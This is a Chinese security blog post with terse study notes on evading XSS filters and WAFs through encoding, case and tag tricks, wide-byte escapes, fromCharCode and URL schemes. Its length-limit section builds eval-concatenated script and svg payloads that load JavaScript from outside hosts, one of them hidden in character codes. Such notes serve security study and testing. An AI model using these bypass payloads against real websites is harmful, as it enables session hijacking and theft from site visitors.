              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  5 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-编码绕过"><a href="#1-编码绕过" class="headerlink" title="1. 编码绕过"></a>1. 编码绕过</h4><ul>
<li>URL编码<ul>
<li>URL只允许用US-ASCII字符集中可打印的字符(0×20—0x7x)</li>
<li>编码方式：字符改成%+ASCII两位十六进制(先把字符串转成ASCII编码，然后再转成十六进制)</li>
<li>+加号代表URL编码的空格，%20也是</li>
<li>&amp;-&gt; %26, # -&gt; %23</li>
</ul>
</li>
<li>Unicode编码<ul>
<li>javascript支持unicode、escapes、十六进制、八进制等编码形式</li>
<li>&lt;不光可以写为\u003c，还可以写为\x3c，&gt;同样可以写为\x3e，空格可以表示为\u0020</li>
</ul>
</li>
<li>html编码<ul>
<li>编码方式：&amp;#加十进制、十六进制ASCII码或unicode字符编码</li>
<li>浏览器解析的时候会先把html编码解析再进行渲染</li>
<li>▲ 编码必须在”值”里，比如属性src里，但却不能对src进行html编码。不然浏览器无法正常的渲染</li>
</ul>
</li>
<li>CSS编码<ul>
<li>编码方式：/斜杠加上1-6位十六进制</li>
<li>\ 反斜线，而css里，允许使用转义字符，+ascii16进制形式</li>
<li>▲ IE5之前都可以用expression来调用js时</li>
</ul>
</li>
</ul>
<h4 id="2-空格-回车-Tab"><a href="#2-空格-回车-Tab" class="headerlink" title="2. 空格/回车/Tab"></a>2. 空格/回车/Tab</h4><ul>
<li><code>&lt;img src= &quot;java　　script:alert(&#39;xss&#39;);&quot; width=100&gt;</code></li>
<li>Javascript通常以分号结尾，如果不是完整的语句，javascript则会继续处理，直到语句完整结束或分号</li>
</ul>
<h4 id="3-改变大小写与重复标签"><a href="#3-改变大小写与重复标签" class="headerlink" title="3. 改变大小写与重复标签"></a>3. 改变大小写与重复标签</h4><ul>
<li><code>&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;/sCRipT&gt;</code></li>
<li><code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;xss&quot;)&lt;/scr&lt;/script&gt;ipt&gt;</code></li>
</ul>
<h4 id="4-宽字节绕过"><a href="#4-宽字节绕过" class="headerlink" title="4. 宽字节绕过"></a>4. 宽字节绕过</h4><ul>
<li>gbxxxx系列的编码 / 过滤：%22 -&gt; %5c%22（\ -&gt; 转义：\）</li>
<li>%c0%22 -&gt; %c0%5c%22 -&gt; %22 -&gt; %c0吃掉%5c</li>
</ul>
<h4 id="5-绕过magic-quotes-gpc"><a href="#5-绕过magic-quotes-gpc" class="headerlink" title="5. 绕过magic_quotes_gpc"></a>5. 绕过magic_quotes_gpc</h4><ul>
<li>magic_quotes_gpc=ON是php中的安全设置，开启后把一些特殊字符进行轮换，比如’(单引号)转换为&#39;，”(双引号)转换为&quot;，\转换为\</li>
<li>例如：<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>转换为<code>&lt;script&gt;alert(\&quot;xss\&quot;)&lt;/script&gt;</code></li>
<li>针对开启了magic_quotes_gpc的网站，我们可以通过JavaScript中的String.formCharCode方法来绕过，我们可以把alert(“xss”);转换为(97,108,101,114,116,40,34,88,83,34,41,59)</li>
<li>▲ String.formCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串</li>
</ul>
<h4 id="6-解决限制字符（要求同页面）"><a href="#6-解决限制字符（要求同页面）" class="headerlink" title="6. 解决限制字符（要求同页面）"></a>6. 解决限制字符（要求同页面）</h4><ul>
<li>▲ 绕过限制字符长度<code>&lt;!--</code></li>
<li>分单元，最后通过eval()函数去拼接，详细过程可看云服务器的Bilibili的存储型XSS</li>
<li>script标签拼接<ul>
<li><code>&lt;script&gt;z=&#39;document.&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;write(&quot;&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;&lt;script&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39; src=ht&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;tp://ww&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;w.shell&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;.net/1.&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;js&gt;&lt;/sc&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;ript&gt;&quot;)&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;eval_r(z)&lt;/script&gt;</code></li>
</ul>
</li>
<li>svg标签拼接<ul>
<li><code>&lt;svg onload=a=&#39;document.writ&#39;&gt;</code></li>
<li><code>&lt;svg onload=b=&#39;e(String.from&#39;&gt;</code></li>
<li><code>&lt;svg onload=c=&#39;CharCode(60,1&#39;&gt;</code></li>
<li><code>&lt;svg onload=d=&#39;15,99,114,105&#39;&gt;</code></li>
<li><code>&lt;svg onload=e=&#39;,112,116,32,1&#39;&gt;</code></li>
<li><code>&lt;svg onload=f=&#39;15,114,99,61,&#39;&gt;</code></li>
<li><code>&lt;svg onload=g=&#39;39,104,116,11&#39;&gt;</code></li>
<li><code>&lt;svg onload=h=&#39;6,112,58,47,4&#39;&gt;</code></li>
<li><code>&lt;svg onload=i=&#39;7,116,46,99,1&#39;&gt;</code></li>
<li><code>&lt;svg onload=j=&#39;10,47,82,52,8&#39;&gt;</code></li>
<li><code>&lt;svg onload=k=&#39;6,84,75,53,66&#39;&gt;</code></li>
<li><code>&lt;svg onload=l=&#39;,39,62,60,47,&#39;&gt;</code></li>
<li><code>&lt;svg onload=m=&#39;115,99,114,10&#39;&gt;</code></li>
<li><code>&lt;svg onload=n=&#39;5,112,116,62)&#39;&gt;</code></li>
<li><code>&lt;svg onload=o=&#39;);&#39;&gt;</code></li>
<li><code>&lt;svg onload=x=a+b+n+d+e+f+g+h&gt;</code></li>
<li><code>&lt;svg onload=t=i+j+k+l+m+n+o&gt;</code></li>
<li><code>&lt;svg onload=eval(x+t)&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="7-浏览器自带的协议"><a href="#7-浏览器自带的协议" class="headerlink" title="7. 浏览器自带的协议"></a>7. 浏览器自带的协议</h4><ul>
<li>通用协议：javascript:alert(1)</li>
<li>Chrome浏览器协议：data:alert(1)</li>
<li>IE浏览器协议：vbscript:alert(1)</li>
</ul>
<h4 id="8-Misc"><a href="#8-Misc" class="headerlink" title="8. Misc"></a>8. Misc</h4><ul>
<li>通过location.hash的方式，将参数写在#号后，既能让JS读取到该参数，又不让该参数传入到服务器，从而避免了WAF的检测</li>
<li>script，/，’’等都被转换成&amp;nbsp，可以用换行符%0a，%0d来进行绕过</li>
<li>eval()函数来替换被过滤的alert()</li>
<li>// -&gt; 注释 -&gt; 换行输出 -&gt;结合&lt;- \ -&gt; javascript，字符串允许下面多行的写法，可以用\来使进行多行输出</li>
<li>优先级：function()函数 &gt; == &gt; &amp;</li>
<li>优先级：svg onload 会比 body onload 先执行</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/2/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">189</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmail邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>Gmail邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">184.3k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
